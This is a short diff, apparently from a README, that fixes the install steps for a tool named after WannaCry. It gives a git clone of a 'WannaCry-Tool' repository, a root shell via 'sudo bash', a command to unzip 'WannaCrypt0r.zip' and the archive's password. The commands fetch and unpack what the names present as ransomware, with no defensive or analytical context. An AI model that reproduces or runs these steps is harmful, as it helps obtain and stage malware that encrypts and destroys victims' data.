@@ -2,8 +2,8 @@ git clone https://github.com/Anonymousmans/WannaCry-Tool.git
 
 sudo bash
 
-cd WannaCry-Tool.git
+cd WannaCry-Tool
 
-unzip WannaCry-Tool.git
+unzip WannaCrypt0r.zip
 
 password : mysubsarethebest
